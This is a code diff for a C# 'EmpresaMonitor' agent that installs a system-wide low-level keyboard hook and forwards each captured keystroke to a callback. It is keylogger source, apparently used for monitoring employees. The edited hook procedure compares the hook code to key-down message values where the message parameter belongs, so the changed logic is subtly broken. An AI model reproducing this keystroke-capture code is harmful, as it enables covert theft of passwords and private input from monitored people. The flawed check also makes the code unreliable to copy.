@@ -178,13 +178,12 @@ namespace EmpresaMonitor.Agent
         [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string n);
 
         private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+        private const int WM_SYSKEYDOWN = 0x0104;
+
         private static IntPtr _h = IntPtr.Zero; 
         private static LowLevelKeyboardProc? _p; 
         private static Func<string, bool, Task>? _cb;
-        
-        private static string _lastKey = "";
-        private static DateTime _lastTime = DateTime.MinValue;
-        private static readonly object _lock = new object();
 
         public static void Install(Func<string, bool, Task> callback) { _cb = callback; _p = Proc; _h = SetHook(_p); }
 
@@ -195,19 +194,12 @@ namespace EmpresaMonitor.Agent
         }
 
         private static IntPtr Proc(int n, IntPtr w, IntPtr l) {
-            if (n >= 0 && _cb != null) {
-                int vkCode = Marshal.ReadInt32(l);
-                string key = ((Keys)vkCode).ToString();
-
-                lock (_lock) {
-                    if (key == _lastKey && (DateTime.Now - _lastTime).TotalMilliseconds < 60) {
-                        return CallNextHookEx(_h, n, w, l);
-                    }
-                    _lastKey = key;
-                    _lastTime = DateTime.Now;
+            if (n == WM_KEYDOWN || n == WM_SYSKEYDOWN) {
+                if (_cb != null) {
+                    int vkCode = Marshal.ReadInt32(l);
+                    string key = ((Keys)vkCode).ToString();
+                    _ = Task.Run(async () => { try { await _cb(key, true); } catch { } });
                 }
-
-                _ = Task.Run(async () => { try { await _cb(key, true); } catch { } });
             }
             return CallNextHookEx(_h, n, w, l);
         }
